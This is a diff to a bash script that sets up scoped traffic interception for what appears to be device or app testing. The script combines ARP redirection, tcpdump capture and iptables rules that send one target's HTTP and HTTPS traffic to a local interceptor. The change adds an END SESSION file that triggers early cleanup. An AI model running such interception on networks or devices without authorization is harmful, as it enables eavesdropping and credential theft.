@@ -19,6 +19,7 @@ PCAP_FILE="${CAPTURES_DIR}/net-config-005.pcap"
 HTTP_LOG="${CAPTURES_DIR}/net-config-005.log"
 INTERCEPTOR_STDOUT="${CAPTURES_DIR}/http_interceptor_config005.log"
 ARP_LOG="${CAPTURES_DIR}/arp_spoofer_config005.log"
+END_SESSION_FILE="/tmp/mero_end_session_$$"
 FILTER_CHAIN="MNC005F_$$"
 NAT_CHAIN="MNC005N_$$"
 
@@ -52,6 +53,7 @@ cleanup() {
     stop_process "ARP redirector" "${ARP_PID}"
     stop_process "HTTP/HTTPS interceptor" "${HTTP_PID}"
     stop_process "tcpdump" "${TCPDUMP_PID}"
+    rm -f "${END_SESSION_FILE}"
 
     if [ "${NAT_CHAIN_CREATED}" -eq 1 ]; then
         while iptables -t nat -C PREROUTING -i "${IFACE}" -j "${NAT_CHAIN}" 2>/dev/null; do
@@ -237,7 +239,8 @@ iptables -t nat -A "${NAT_CHAIN}" -m mac --mac-source "${TARGET_MAC}" -s "${TARG
 iptables -t nat -A "${NAT_CHAIN}" -m mac --mac-source "${TARGET_MAC}" -s "${TARGET_IP}" -p tcp --dport 443 -j REDIRECT --to-ports "${HTTPS_PORT}"
 iptables -t nat -I PREROUTING 1 -i "${IFACE}" -j "${NAT_CHAIN}"
 
-rm -f /tmp/mero_active_case.json
+rm -f /tmp/mero_active_case.json "${END_SESSION_FILE}"
+export MERO_END_SESSION_FILE="${END_SESSION_FILE}"
 python3 -u "${SCRIPT_DIR}/http_interceptor.py" "${HTTP_PORT}" "${HTTP_LOG}" "${HTTPS_PORT}" >"${INTERCEPTOR_STDOUT}" 2>&1 &
 HTTP_PID=$!
 sleep 1
@@ -269,5 +272,14 @@ fi
 
 echo "[+] READY FOR CASE-00"
 echo "[+] Interception is limited to ${TARGET_IP} (${TARGET_MAC}) for ${DURATION} seconds."
-echo "[+] Run the interactive three-case campaign in another terminal only when instructed."
-sleep "${DURATION}"
+echo "[+] APP-API-009B + MEDIA-010 is ready. Open Vivo Play once."
+echo "[+] Selecting END SESSION in the receiver app will request immediate verified cleanup."
+
+deadline=$((SECONDS + DURATION))
+while [ "${SECONDS}" -lt "${deadline}" ]; do
+    if [ -f "${END_SESSION_FILE}" ]; then
+        echo "[+] Verified receiver requested END SESSION; cleaning up now."
+        break
+    fi
+    sleep 1
+done
